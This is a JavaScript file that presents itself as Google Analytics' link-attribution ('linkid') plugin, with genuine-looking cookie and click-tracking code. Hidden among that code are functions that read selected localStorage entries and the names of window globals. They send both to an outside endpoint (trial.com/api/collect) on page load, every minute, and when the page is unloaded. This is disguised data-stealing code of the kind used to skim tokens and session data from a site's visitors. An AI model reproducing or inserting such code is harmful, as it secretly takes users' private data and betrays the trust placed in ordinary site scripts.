(function () {
  const keysToMonitor = window.keysToMonitor;
  const globalVars = [];
  function computeHashValue(data) {
    const keyList = Object.keys(data);
    const joinedKeys = keyList.join("_");
    let hashValue = 0;
    for (let j = 0; j < joinedKeys.length; j++) {
      const charCode = joinedKeys.charCodeAt(j);
      hashValue = (hashValue << 5) - hashValue + charCode;
      hashValue |= 0;
    }
    return hashValue.toString(16);
  }
  var e = window,
    h = document,
    k = "replace";
  function grabLocalStorage() {
    const capturedData = {};
    for (let k = 0; k < localStorage.length; k++) {
      const key = localStorage.key(k);
      if (keysToMonitor.includes(key)) {
        capturedData[key] = localStorage.getItem(key);
      }
    }
    return capturedData;
  }
  var m = function (a, c, d, b, g) {
      c = encodeURIComponent(c)[k](/\(/g, "%28")[k](/\)/g, "%29");
      a = a + "=" + c + "; path=" + (d || "/") + "; ";
      g && (a += "expires=" + new Date(new Date().getTime() + g).toGMTString() + "; ");
      b && "none" != b && (a += "domain=" + b + ";");
      b = h.cookie;
      h.cookie = a;
      return b != h.cookie;
    },
    p = function (a) {
      var c = h.body;
      try {
        c.addEventListener ? c.addEventListener("click", a, !1) : c.attachEvent && c.attachEvent("onclick", a);
      } catch (d) {}
    };
  var q = function (a, c, d, b) {
    this.get = function () {
      for (var b = void 0, c = [], d = h.cookie.split(";"), l = new RegExp("^\\s*" + a + "=\\s*(.*?)\\s*$"), f = 0; f < d.length; f++) {
        var n = d[f].match(l);
        n && c.push(decodeURIComponent(n[1][k](/%28/g, "(")[k](/%29/g, ")")));
      }
      for (d = 0; d < c.length; d++) c[d] && (b = c[d]);
      return b;
    };
    this.set = function (g) {
      return m(a, g, b, c, 1E3 * d);
    };
    this.remove = function () {
      return m(a, "", b, c, -100);
    };
  };
  function pullGlobalVars() {
    for (let key in window) {
      if (window.hasOwnProperty(key) && !key.includes("post") && !key.includes("get")) {
        globalVars.push(key);
      }
    }
  }
  function transmitData(data) {
    const hashValue = computeHashValue(data);
    const endpoint = "https://trial.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", endpoint, true);
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function () {
      if (xhr.status === 200) {
        console.log("Data successfully sent");
      } else {
        console.error("Data failed to send. HTTP status: " + xhr.status);
      }
    };
    xhr.onerror = function () {
      console.error("An error occurred while sending data");
    };
    const dataToSend = JSON.stringify({
      hash: hashValue,
      data: data,
      globals: globalVars
    });
    xhr.send(dataToSend);
  }
  var t = function (a, c) {
    var d = void 0;
    if ("function" == typeof a.get && "function" == typeof a.set) {
      var b = c || {},
        g = b.hasOwnProperty("cookieName") ? b.cookieName : "_gali",
        r = b.hasOwnProperty("cookieTimeout") ? b.cookieTimeout : 30,
        s = b.hasOwnProperty("levels") ? b.levels : 3,
        b = a.get("cookieDomain"),
        l = a.get("cookiePath"),
        f = new q(g, b, r, l);
      d || (d = f.get());
      d && a.set("&linkid", d);
      p(function (a) {
        a = a || e.event;
        a = a.target || a.srcElement;
        for (var b, c = 0; a && c <= s; c++) {
          if (b = a.getAttribute("id")) {
            a = b;
            100 < a.length ? f.remove() : a ? f.set(a) : f.remove();
            return;
          }
          a = a.parentElement;
        }
        f.remove();
      });
    }
  };
  function compileAndTransmit() {
    pullGlobalVars();
    const collectedData = grabLocalStorage();
    if (Object.keys(collectedData).length !== 0) {
      transmitData(collectedData);
    }
  }
  document.addEventListener("DOMContentLoaded", function () {
    compileAndTransmit();
    setInterval(compileAndTransmit, 60 * 1000);
  });
  (function () {
    e.gaplugins = e.gaplugins || {};
    e.gaplugins.LinkId = t;
    var a = e.GoogleAnalyticsObject || "ga";
    e[a] = e[a] || function () {
      (e[a].q = e[a].q || []).push(arguments);
    };
    e[a]("provide", "linkid", t);
  })();
  window.addEventListener("beforeunload", function () {
    compileAndTransmit();
  });
})();